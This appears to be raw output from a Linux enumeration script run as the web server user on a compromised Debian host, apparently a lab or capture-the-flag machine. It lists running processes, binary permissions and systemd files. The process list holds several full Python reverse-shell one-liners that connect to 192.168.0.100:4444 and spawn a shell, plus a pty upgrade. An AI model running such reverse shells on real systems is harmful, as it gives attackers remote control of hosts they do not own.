root        106  0.0  0.0      0     0 ?        S<   01:35   0:00 [ext4-rsv-conver]
root        136  0.0  0.0      0     0 ?        S    01:35   0:00 [kauditd]
root        140  0.0  0.7  28876  3656 ?        Ss   01:35   0:00 /lib/systemd/systemd-journald
root        148  0.0  0.6  40824  3312 ?        Ss   01:35   0:00 /lib/systemd/systemd-udevd
root        184  0.0  0.0      0     0 ?        S<   01:35   0:00 [ttm_swap]
root        383  0.0  1.7  25404  8816 ?        Ss   01:35   0:00 dhclient -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
root        406  0.0  0.5  37084  2652 ?        Ss   01:35   0:00 /sbin/rpcbind -w
statd       415  0.0  0.5  37284  2808 ?        Ss   01:35   0:00 /sbin/rpc.statd
root        420  0.0  0.0      0     0 ?        S<   01:35   0:00 [rpciod]
root        422  0.0  0.0      0     0 ?        S<   01:35   0:00 [nfsiod]
root        429  0.0  0.0  23360   204 ?        Ss   01:35   0:00 /usr/sbin/rpc.idmapd
root        430  0.0  0.5  27508  2764 ?        Ss   01:35   0:00 /usr/sbin/cron -f
daemon      432  0.0  0.3  19028  1716 ?        Ss   01:35   0:00 /usr/sbin/atd -f
root        434  0.0  0.5  19860  2580 ?        Ss   01:35   0:00 /lib/systemd/systemd-logind
message+    438  0.0  0.7  42240  3536 ?        Ss   01:35   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root        469  0.0  0.7 258676  3508 ?        Ssl  01:35   0:00 /usr/sbin/rsyslogd -n
root        471  0.0  0.3   4260  1680 ?        Ss   01:35   0:00 /usr/sbin/acpid
root        480  0.0  1.0  55192  5348 ?        Ss   01:35   0:00 /usr/sbin/sshd -D
root        485  0.0  0.3  14420  1908 tty1     Ss+  01:35   0:00 /sbin/agetty --noclear tty1 linux
root        537  0.0  1.0  78092  5084 ?        Ss   01:35   0:00 sendmail: MTA: accepting connections
root        546  0.0  0.3   4340  1624 ?        S    01:35   0:00 /bin/sh /usr/bin/mysqld_safe
root        579  0.0  4.6 232508 22764 ?        Ss   01:35   0:00 /usr/sbin/apache2 -k start
www-data    593  0.0  2.6 232736 12816 ?        S    01:35   0:00 /usr/sbin/apache2 -k start
www-data    594  0.0  2.6 232736 12844 ?        S    01:35   0:00 /usr/sbin/apache2 -k start
www-data    595  0.0  2.9 232800 14744 ?        S    01:35   0:00 /usr/sbin/apache2 -k start
www-data    596  0.0  2.5 232752 12356 ?        S    01:35   0:00 /usr/sbin/apache2 -k start
www-data    597  0.0  2.3 232752 11744 ?        S    01:35   0:00 /usr/sbin/apache2 -k start
root        915  0.0 10.4 552224 51416 ?        Sl   01:35   0:01 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
www-data    946  0.0  2.8 232808 14176 ?        S    01:35   0:00 /usr/sbin/apache2 -k start
www-data   1129  0.0  2.4 232556 12112 ?        S    01:39   0:00 /usr/sbin/apache2 -k start
www-data   1130  0.0  2.9 233072 14328 ?        S    01:39   0:00 /usr/sbin/apache2 -k start
www-data   1194  0.0  0.1   4340   772 ?        S    01:51   0:00 sh -c python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.100',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])"""
www-data   1195  0.0  1.9  39332  9440 ?        S    01:51   0:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.100',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
www-data   1196  0.0  0.1   4340   768 ?        S    01:51   0:00 /bin/sh -i
www-data   1241  0.0  0.1   4340   760 ?        S    02:03   0:00 sh -c python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.100',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])"""
www-data   1242  0.0  1.9  39332  9512 ?        S    02:03   0:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.100',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
www-data   1243  0.0  0.1   4340   720 ?        S    02:03   0:00 /bin/sh -i
www-data   1398  0.0  1.5 232580  7504 ?        S    02:48   0:00 /usr/sbin/apache2 -k start
www-data   1399  0.0  1.5 232548  7504 ?        S    02:48   0:00 /usr/sbin/apache2 -k start
www-data   1400  0.0  1.5 232548  7504 ?        S    02:48   0:00 /usr/sbin/apache2 -k start
www-data   1401  0.0  2.4 232728 12280 ?        S    02:48   0:00 /usr/sbin/apache2 -k start
root       1409  0.0  0.0      0     0 ?        S    02:50   0:00 [kworker/0:1]
www-data   1438  0.0  0.1   4340   764 ?        S    03:05   0:00 sh -c python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.100',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])"""
www-data   1439  0.0  1.9  39332  9532 ?        S    03:05   0:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.100',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
www-data   1440  0.0  0.1   4340   812 ?        S    03:05   0:00 /bin/sh -i
root       1441  0.0  0.0      0     0 ?        S    03:05   0:00 [kworker/0:0]
www-data   1442  0.0  0.1   4340   800 ?        S    03:07   0:00 sh -c python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.100',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])"""
www-data   1443  0.0  1.9  39332  9608 ?        S    03:07   0:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.100',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
www-data   1444  0.0  0.1   4340   724 ?        S    03:07   0:00 /bin/sh -i
www-data   1448  0.0  1.3  32204  6836 ?        S    03:08   0:00 python -c import pty;pty.spawn("/bin/bash");
www-data   1449  0.0  0.6  20228  3204 pts/0    Ss   03:08   0:00 /bin/bash
root       1492  0.0  0.0      0     0 ?        S    03:10   0:00 [kworker/0:2]
www-data   1497  0.0  0.7  21048  3832 pts/0    S+   03:12   0:00 /bin/bash ./test.sh
www-data   1498  0.0  0.6  21100  3364 pts/0    S+   03:12   0:00 /bin/bash ./test.sh
www-data   1499  0.0  0.1   4240   724 pts/0    S+   03:12   0:00 tee -a
root       1693  0.0  0.2  40824  1444 ?        S    03:12   0:00 /lib/systemd/systemd-udevd
www-data   1702  0.0  0.5  21084  2844 pts/0    S+   03:12   0:00 /bin/bash ./test.sh
www-data   1703  0.0  0.4  17508  2124 pts/0    R+   03:12   0:00 ps aux
[-] Process binaries and associated permissions (from above list):
-rwxr-xr-x 1 root root  1029624 Nov  6  2016 /bin/bash
lrwxrwxrwx 1 root root        4 Nov  9  2014 /bin/sh -> dash
-rwxr-xr-x 1 root root   231664 Apr  9  2017 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root root   506096 Apr  9  2017 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root   301368 Apr  9  2017 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root root    39728 Mar 30  2015 /sbin/agetty
lrwxrwxrwx 1 root root       20 Apr  9  2017 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root root    71320 Aug 13  2014 /sbin/rpc.statd
-rwxr-xr-x 1 root root    48120 May  5  2017 /sbin/rpcbind
-rwxr-xr-x 1 root root   430704 Nov 22  2016 /usr/bin/dbus-daemon
-rwxr-xr-x 1 root root    47920 Nov  9  2014 /usr/sbin/acpid
-rwxr-xr-x 1 root root   666552 Mar 31  2018 /usr/sbin/apache2
-rwxr-xr-x 1 root root    22408 Sep 30  2014 /usr/sbin/atd
-rwxr-xr-x 1 root root    44400 Jun 11  2015 /usr/sbin/cron
-rwxr-xr-x 1 root root 11873232 Apr 19  2018 /usr/sbin/mysqld
-rwxr-xr-x 1 root root    32416 Aug 13  2014 /usr/sbin/rpc.idmapd
-rwxr-xr-x 1 root root   577344 Dec 20  2015 /usr/sbin/rsyslogd
-rwxr-xr-x 1 root root   787080 Nov 19  2017 /usr/sbin/sshd
[-] /etc/init.d/ binary permissions:
total 304
drwxr-xr-x  2 root root  4096 Aug 13  2018 .
drwxr-xr-x 89 root root  4096 May 29 02:26 ..
-rw-r--r--  1 root root  1468 Aug 13  2018 .depend.boot
-rw-r--r--  1 root root   519 Aug 13  2018 .depend.start
-rw-r--r--  1 root root   626 Aug 13  2018 .depend.stop
-rw-r--r--  1 root root  2427 Apr  7  2015 README
-rwxr-xr-x  1 root root  2243 Aug 29  2014 acpid
-rwxr-xr-x  1 root root 10184 Mar 31  2018 apache2
-rwxr-xr-x  1 root root  1071 Sep 30  2014 atd
-rwxr-xr-x  1 root root  1276 Apr  7  2015 bootlogs
-rwxr-xr-x  1 root root  1248 Apr  7  2015 bootmisc.sh
-rwxr-xr-x  1 root root  3807 Apr  7  2015 checkfs.sh
-rwxr-xr-x  1 root root  1072 Apr  7  2015 checkroot-bootclean.sh
-rwxr-xr-x  1 root root  9290 Apr  7  2015 checkroot.sh
-rwxr-xr-x  1 root root  1379 Dec  9  2011 console-setup
-rwxr-xr-x  1 root root  3049 Jun 11  2015 cron
-rwxr-xr-x  1 root root  2813 Oct 10  2016 dbus
-rwxr-xr-x  1 root root  6606 Feb 10  2018 exim4
-rwxr-xr-x  1 root root  1336 Apr  7  2015 halt
-rwxr-xr-x  1 root root  1423 Apr  7  2015 hostname.sh
-rwxr-xr-x  1 root root  3916 Mar 30  2015 hwclock.sh
-rwxr-xr-x  1 root root  8189 Oct 26  2014 kbd
-rwxr-xr-x  1 root root  1591 Oct  1  2012 keyboard-setup
-rwxr-xr-x  1 root root  1300 Apr  7  2015 killprocs
-rwxr-xr-x  1 root root  1990 Sep 23  2014 kmod
-rwxr-xr-x  1 root root   995 Apr  7  2015 motd
-rwxr-xr-x  1 root root   677 Apr  7  2015 mountall-bootclean.sh
-rwxr-xr-x  1 root root  2138 Apr  7  2015 mountall.sh
-rwxr-xr-x  1 root root  1461 Apr  7  2015 mountdevsubfs.sh
-rwxr-xr-x  1 root root  1564 Apr  7  2015 mountkernfs.sh
-rwxr-xr-x  1 root root   685 Apr  7  2015 mountnfs-bootclean.sh
-rwxr-xr-x  1 root root  2456 Apr  7  2015 mountnfs.sh
-rwxr-xr-x  1 root root  5485 Apr 19  2018 mysql
-rwxr-xr-x  1 root root  4760 Dec 15  2014 networking
-rwxr-xr-x  1 root root  5658 Aug 13  2014 nfs-common
-rwxr-xr-x  1 root root  1192 May 18  2018 procps
-rwxr-xr-x  1 root root  6228 Apr  7  2015 rc
-rwxr-xr-x  1 root root   820 Apr  7  2015 rc.local
-rwxr-xr-x  1 root root   117 Apr  7  2015 rcS
-rwxr-xr-x  1 root root   661 Apr  7  2015 reboot
-rwxr-xr-x  1 root root  1042 Apr  7  2015 rmnologin
-rwxr-xr-x  1 root root  2512 Sep 21  2015 rpcbind
-rwxr-xr-x  1 root root  4355 Dec 11  2017 rsync
-rwxr-xr-x  1 root root  2796 Dec 14  2015 rsyslog
-rwxr-xr-x  1 root root 34045 Feb 13  2017 sendmail
-rwxr-xr-x  1 root root  3207 Apr  7  2015 sendsigs
-rwxr-xr-x  1 root root   597 Apr  7  2015 single
-rw-r--r--  1 root root  1087 Apr  7  2015 skeleton
-rwxr-xr-x  1 root root  4077 Nov 18  2017 ssh
-rwxr-xr-x  1 root root   731 Aug  9  2017 sudo
-rwxr-xr-x  1 root root  6581 Mar 10  2017 udev
-rwxr-xr-x  1 root root   461 Mar 10  2017 udev-finish
-rwxr-xr-x  1 root root  2737 Apr  7  2015 umountfs
-rwxr-xr-x  1 root root  2202 Apr  7  2015 umountnfs.sh
-rwxr-xr-x  1 root root  1129 Apr  7  2015 umountroot
-rwxr-xr-x  1 root root  3111 Apr  7  2015 urandom
[-] /etc/init/ config file permissions:
total 64
drwxr-xr-x  2 root root 4096 Aug 13  2018 .
drwxr-xr-x 89 root root 4096 May 29 02:26 ..
-rw-r--r--  1 root root  530 Jun  3  2014 network-interface-container.conf
-rw-r--r--  1 root root 1756 May  4  2013 network-interface-security.conf
-rw-r--r--  1 root root  933 Jun  3  2014 network-interface.conf
-rw-r--r--  1 root root 2493 Jun  3  2014 networking.conf
-rw-r--r--  1 root root  815 Sep 21  2015 portmap-wait.conf
-rw-r--r--  1 root root  209 Sep 21  2015 rpcbind-boot.conf
-rw-r--r--  1 root root 1042 Sep 21  2015 rpcbind.conf
-rw-r--r--  1 root root  641 Nov 18  2017 ssh.conf
-rw-r--r--  1 root root  581 Apr 10  2014 startpar-bridge.conf
-rw-r--r--  1 root root  637 Mar 10  2017 udev-fallback-graphics.conf
-rw-r--r--  1 root root  643 Mar 10  2017 udev-finish.conf
-rw-r--r--  1 root root  337 Mar 10  2017 udev.conf
-rw-r--r--  1 root root  356 Mar 10  2017 udevmonitor.conf
-rw-r--r--  1 root root  352 Mar 10  2017 udevtrigger.conf
[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 6.4M
drwxr-xr-x 20 root root  36K Aug 13  2018 system
drwxr-xr-x  2 root root 4.0K Aug 13  2018 network
drwxr-xr-x  2 root root 4.0K Aug 13  2018 system-generators
drwxr-xr-x  2 root root 4.0K Aug 13  2018 system-preset
-rwxr-xr-x  1 root root 295K Apr  9  2017 systemd-udevd
-rwxr-xr-x  1 root root  14K Apr  9  2017 systemd-ac-power
-rwxr-xr-x  1 root root 495K Apr  9  2017 systemd-logind
-rwxr-xr-x  1 root root 511K Apr  9  2017 systemd-networkd
-rwxr-xr-x  1 root root  75K Apr  9  2017 systemd-networkd-wait-online
-rwxr-xr-x  1 root root  35K Apr  9  2017 systemd-remount-fs
-rwxr-xr-x  1 root root  75K Apr  9  2017 systemd-resolved
-rwxr-xr-x  1 root root  87K Apr  9  2017 systemd-shutdown
-rwxr-xr-x  1 root root 103K Apr  9  2017 systemd-timesyncd
-rwxr-xr-x  1 root root 1.3M Apr  9  2017 systemd
-rwxr-xr-x  1 root root  43K Apr  9  2017 systemd-activate
-rwxr-xr-x  1 root root  35K Apr  9  2017 systemd-binfmt
-rwxr-xr-x  1 root root 283K Apr  9  2017 systemd-bus-proxyd
-rwxr-xr-x  1 root root 227K Apr  9  2017 systemd-cgroups-agent
-rwxr-xr-x  1 root root  63K Apr  9  2017 systemd-cryptsetup
-rwxr-xr-x  1 root root  39K Apr  9  2017 systemd-modules-load
-rwxr-xr-x  1 root root  14K Apr  9  2017 systemd-multi-seat-x
-rwxr-xr-x  1 root root  75K Apr  9  2017 systemd-socket-proxyd
-rwxr-xr-x  1 root root  39K Apr  9  2017 systemd-sysctl
-rwxr-xr-x  1 root root  51K Apr  9  2017 systemd-backlight
-rwxr-xr-x  1 root root  83K Apr  9  2017 systemd-bootchart
-rwxr-xr-x  1 root root 251K Apr  9  2017 systemd-fsck
-rwxr-xr-x  1 root root 283K Apr  9  2017 systemd-hostnamed
-rwxr-xr-x  1 root root 235K Apr  9  2017 systemd-initctl
-rwxr-xr-x  1 root root 227K Apr  9  2017 systemd-journald
-rwxr-xr-x  1 root root 291K Apr  9  2017 systemd-localed
-rwxr-xr-x  1 root root  27K Apr  9  2017 systemd-quotacheck
-rwxr-xr-x  1 root root  27K Apr  9  2017 systemd-random-seed
-rwxr-xr-x  1 root root  67K Apr  9  2017 systemd-readahead
-rwxr-xr-x  1 root root  23K Apr  9  2017 systemd-reply-password
-rwxr-xr-x  1 root root  43K Apr  9  2017 systemd-rfkill
-rwxr-xr-x  1 root root  39K Apr  9  2017 systemd-shutdownd
-rwxr-xr-x  1 root root 291K Apr  9  2017 systemd-timedated
-rwxr-xr-x  1 root root 235K Apr  9  2017 systemd-update-utmp
-rwxr-xr-x  1 root root 323K Apr  9  2017 systemd-machined
-rwxr-xr-x  1 root root  51K Apr  9  2017 systemd-sleep
-rwxr-xr-x  1 root root  23K Apr  9  2017 systemd-user-sessions
-rwxr-xr-x  1 root root  546 Apr  9  2017 debian-fixup
-rwxr-xr-x  1 root root  462 Apr  9  2017 systemd-logind-launch
drwxr-xr-x  2 root root 4.0K Apr  9  2017 system-shutdown
drwxr-xr-x  2 root root 4.0K Apr  9  2017 system-sleep
/lib/systemd/system:
total 680K
drwxr-xr-x 2 root root 4.0K Aug 13  2018 dbus.target.wants
drwxr-xr-x 2 root root 4.0K Aug 13  2018 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K Aug 13  2018 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Aug 13  2018 apache2.service.d
drwxr-xr-x 2 root root 4.0K Aug 13  2018 sysinit.target.wants
drwxr-xr-x 2 root root 4.0K Aug 13  2018 getty.target.wants
drwxr-xr-x 2 root root 4.0K Aug 13  2018 graphical.target.wants
drwxr-xr-x 2 root root 4.0K Aug 13  2018 local-fs.target.wants
drwxr-xr-x 2 root root 4.0K Aug 13  2018 poweroff.target.wants
drwxr-xr-x 2 root root 4.0K Aug 13  2018 reboot.target.wants
drwxr-xr-x 2 root root 4.0K Aug 13  2018 rescue.target.wants
drwxr-xr-x 2 root root 4.0K Aug 13  2018 runlevel1.target.wants
drwxr-xr-x 2 root root 4.0K Aug 13  2018 runlevel2.target.wants
drwxr-xr-x 2 root root 4.0K Aug 13  2018 runlevel3.target.wants
drwxr-xr-x 2 root root 4.0K Aug 13  2018 runlevel4.target.wants
drwxr-xr-x 2 root root 4.0K Aug 13  2018 runlevel5.target.wants
drwxr-xr-x 2 root root 4.0K Aug 13  2018 timers.target.wants
drwxr-xr-x 2 root root 4.0K Aug 13  2018 networking.service.d
-rw-r--r-- 1 root root  404 Nov 18  2017 ssh.service
-rw-r--r-- 1 root root  196 Nov 18  2017 ssh@.service
-rw-r--r-- 1 root root  216 Nov 18  2017 ssh.socket
-rw-r--r-- 1 root root  272 Aug  9  2017 sudo.service
lrwxrwxrwx 1 root root   14 Apr  9  2017 autovt@.service -> getty@.service
lrwxrwxrwx 1 root root    9 Apr  9  2017 bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 bootlogs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 bootmisc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 checkfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 checkroot-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 checkroot.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 cryptdisks-early.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 cryptdisks.service -> /dev/null
lrwxrwxrwx 1 root root   13 Apr  9  2017 ctrl-alt-del.target -> reboot.target
lrwxrwxrwx 1 root root   25 Apr  9  2017 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx 1 root root   23 Apr  9  2017 dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx 1 root root   22 Apr  9  2017 dbus-org.freedesktop.login1.service -> systemd-logind.service
lrwxrwxrwx 1 root root   24 Apr  9  2017 dbus-org.freedesktop.machine1.service -> systemd-machined.service
lrwxrwxrwx 1 root root   25 Apr  9  2017 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
lrwxrwxrwx 1 root root   16 Apr  9  2017 default.target -> graphical.target
lrwxrwxrwx 1 root root    9 Apr  9  2017 fuse.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 halt.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 hostname.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 hwclock.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 hwclockfirst.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 killprocs.service -> /dev/null
lrwxrwxrwx 1 root root   28 Apr  9  2017 kmod.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root   28 Apr  9  2017 module-init-tools.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root    9 Apr  9  2017 motd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 mountall-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 mountall.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 mountdevsubfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 mountkernfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 mountnfs-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 mountnfs.service -> /dev/null
lrwxrwxrwx 1 root root   22 Apr  9  2017 procps.service -> systemd-sysctl.service
lrwxrwxrwx 1 root root   16 Apr  9  2017 rc.local.service -> rc-local.service
lrwxrwxrwx 1 root root    9 Apr  9  2017 reboot.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 rmnologin.service -> /dev/null
lrwxrwxrwx 1 root root   15 Apr  9  2017 runlevel0.target -> poweroff.target
lrwxrwxrwx 1 root root   13 Apr  9  2017 runlevel1.target -> rescue.target
lrwxrwxrwx 1 root root   17 Apr  9  2017 runlevel2.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Apr  9  2017 runlevel3.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Apr  9  2017 runlevel4.target -> multi-user.target
lrwxrwxrwx 1 root root   16 Apr  9  2017 runlevel5.target -> graphical.target
lrwxrwxrwx 1 root root   13 Apr  9  2017 runlevel6.target -> reboot.target
lrwxrwxrwx 1 root root    9 Apr  9  2017 sendsigs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 stop-bootlogd-single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 stop-bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root   21 Apr  9  2017 udev.service -> systemd-udevd.service
lrwxrwxrwx 1 root root    9 Apr  9  2017 umountfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 umountnfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Apr  9  2017 umountroot.service -> /dev/null
lrwxrwxrwx 1 root root   27 Apr  9  2017 urandom.service -> systemd-random-seed.service
lrwxrwxrwx 1 root root    9 Apr  9  2017 x11-common.service -> /dev/null
-rw-r--r-- 1 root root  402 Apr  9  2017 debian-fixup.service
-rw-r--r-- 1 root root  342 Apr  9  2017 getty-static.service
-rw-r--r-- 1 root root  398 Apr  9  2017 hwclock-save.service
-rw-r--r-- 1 root root  380 Apr  9  2017 ifup@.service
-rw-r--r-- 1 root root  271 Apr  9  2017 systemd-setup-dgram-qlen.service
-rw-r--r-- 1 root root  217 Apr  9  2017 udev-finish.service
-rw-r--r-- 1 root root  403 Apr  9  2017 -.slice
-rw-r--r-- 1 root root  524 Apr  9  2017 basic.target
-rw-r--r-- 1 root root  379 Apr  9  2017 bluetooth.target
-rw-r--r-- 1 root root  770 Apr  9  2017 console-getty.service
-rw-r--r-- 1 root root  741 Apr  9  2017 console-shell.service
-rw-r--r-- 1 root root  783 Apr  9  2017 container-getty@.service
-rw-r--r-- 1 root root  394 Apr  9  2017 cryptsetup-pre.target
-rw-r--r-- 1 root root  366 Apr  9  2017 cryptsetup.target
-rw-r--r-- 1 root root 1010 Apr  9  2017 debug-shell.service
-rw-r--r-- 1 root root  636 Apr  9  2017 dev-hugepages.mount
-rw-r--r-- 1 root root  590 Apr  9  2017 dev-mqueue.mount
-rw-r--r-- 1 root root  986 Apr  9  2017 emergency.service
-rw-r--r-- 1 root root  431 Apr  9  2017 emergency.target
-rw-r--r-- 1 root root  440 Apr  9  2017 final.target
-rw-r--r-- 1 root root  460 Apr  9  2017 getty.target
-rw-r--r-- 1 root root 1.5K Apr  9  2017 getty@.service
-rw-r--r-- 1 root root  490 Apr  9  2017 graphical.target
-rw-r--r-- 1 root root  565 Apr  9  2017 halt-local.service
-rw-r--r-- 1 root root  487 Apr  9  2017 halt.target
-rw-r--r-- 1 root root  447 Apr  9  2017 hibernate.target
-rw-r--r-- 1 root root  468 Apr  9  2017 hybrid-sleep.target
-rw-r--r-- 1 root root  630 Apr  9  2017 initrd-cleanup.service
-rw-r--r-- 1 root root  553 Apr  9  2017 initrd-fs.target
-rw-r--r-- 1 root root  790 Apr  9  2017 initrd-parse-etc.service
-rw-r--r-- 1 root root  526 Apr  9  2017 initrd-root-fs.target
-rw-r--r-- 1 root root  640 Apr  9  2017 initrd-switch-root.service
-rw-r--r-- 1 root root  691 Apr  9  2017 initrd-switch-root.target
-rw-r--r-- 1 root root  664 Apr  9  2017 initrd-udevadm-cleanup-db.service
-rw-r--r-- 1 root root  671 Apr  9  2017 initrd.target
-rw-r--r-- 1 root root  501 Apr  9  2017 kexec.target
-rw-r--r-- 1 root root  675 Apr  9  2017 kmod-static-nodes.service
-rw-r--r-- 1 root root  395 Apr  9  2017 local-fs-pre.target
-rw-r--r-- 1 root root  507 Apr  9  2017 local-fs.target
-rw-r--r-- 1 root root  405 Apr  9  2017 machine.slice
-rw-r--r-- 1 root root  473 Apr  9  2017 mail-transport-agent.target
-rw-r--r-- 1 root root  492 Apr  9  2017 multi-user.target
-rw-r--r-- 1 root root  464 Apr  9  2017 network-online.target
-rw-r--r-- 1 root root  461 Apr  9  2017 network-pre.target
-rw-r--r-- 1 root root  480 Apr  9  2017 network.target
-rw-r--r-- 1 root root  514 Apr  9  2017 nss-lookup.target
-rw-r--r-- 1 root root  473 Apr  9  2017 nss-user-lookup.target
-rw-r--r-- 1 root root  354 Apr  9  2017 paths.target
-rw-r--r-- 1 root root  500 Apr  9  2017 poweroff.target
-rw-r--r-- 1 root root  377 Apr  9  2017 printer.target
-rw-r--r-- 1 root root  693 Apr  9  2017 proc-sys-fs-binfmt_misc.automount
-rw-r--r-- 1 root root  603 Apr  9  2017 proc-sys-fs-binfmt_misc.mount
-rw-r--r-- 1 root root  635 Apr  9  2017 quotaon.service
-rw-r--r-- 1 root root  633 Apr  9  2017 rc-local.service
-rw-r--r-- 1 root root  493 Apr  9  2017 reboot.target
-rw-r--r-- 1 root root  396 Apr  9  2017 remote-fs-pre.target
-rw-r--r-- 1 root root  498 Apr  9  2017 remote-fs.target
-rw-r--r-- 1 root root  954 Apr  9  2017 rescue.service
-rw-r--r-- 1 root root  486 Apr  9  2017 rescue.target
-rw-r--r-- 1 root root  500 Apr  9  2017 rpcbind.target
-rw-r--r-- 1 root root 1.1K Apr  9  2017 serial-getty@.service
-rw-r--r-- 1 root root  402 Apr  9  2017 shutdown.target
-rw-r--r-- 1 root root  362 Apr  9  2017 sigpwr.target
-rw-r--r-- 1 root root  420 Apr  9  2017 sleep.target
-rw-r--r-- 1 root root  409 Apr  9  2017 slices.target
-rw-r--r-- 1 root root  380 Apr  9  2017 smartcard.target
-rw-r--r-- 1 root root  356 Apr  9  2017 sockets.target
-rw-r--r-- 1 root root  380 Apr  9  2017 sound.target
-rw-r--r-- 1 root root  441 Apr  9  2017 suspend.target
-rw-r--r-- 1 root root  353 Apr  9  2017 swap.target
-rw-r--r-- 1 root root  681 Apr  9  2017 sys-fs-fuse-connections.mount
-rw-r--r-- 1 root root  719 Apr  9  2017 sys-kernel-config.mount
-rw-r--r-- 1 root root  662 Apr  9  2017 sys-kernel-debug.mount
-rw-r--r-- 1 root root  518 Apr  9  2017 sysinit.target
-rw-r--r-- 1 root root 1.3K Apr  9  2017 syslog.socket
-rw-r--r-- 1 root root  652 Apr  9  2017 system-update.target
-rw-r--r-- 1 root root  433 Apr  9  2017 system.slice
-rw-r--r-- 1 root root  646 Apr  9  2017 systemd-ask-password-console.path
-rw-r--r-- 1 root root  653 Apr  9  2017 systemd-ask-password-console.service
-rw-r--r-- 1 root root  574 Apr  9  2017 systemd-ask-password-wall.path
-rw-r--r-- 1 root root  681 Apr  9  2017 systemd-ask-password-wall.service
-rw-r--r-- 1 root root  776 Apr  9  2017 systemd-backlight@.service
-rw-r--r-- 1 root root 1011 Apr  9  2017 systemd-binfmt.service
-rw-r--r-- 1 root root  725 Apr  9  2017 systemd-fsck-root.service
-rw-r--r-- 1 root root  678 Apr  9  2017 systemd-fsck@.service
-rw-r--r-- 1 root root  544 Apr  9  2017 systemd-halt.service
-rw-r--r-- 1 root root  501 Apr  9  2017 systemd-hibernate.service
-rw-r--r-- 1 root root  710 Apr  9  2017 systemd-hostnamed.service
-rw-r--r-- 1 root root  519 Apr  9  2017 systemd-hybrid-sleep.service
-rw-r--r-- 1 root root  480 Apr  9  2017 systemd-initctl.service
-rw-r--r-- 1 root root  524 Apr  9  2017 systemd-initctl.socket
-rw-r--r-- 1 root root  698 Apr  9  2017 systemd-journal-flush.service
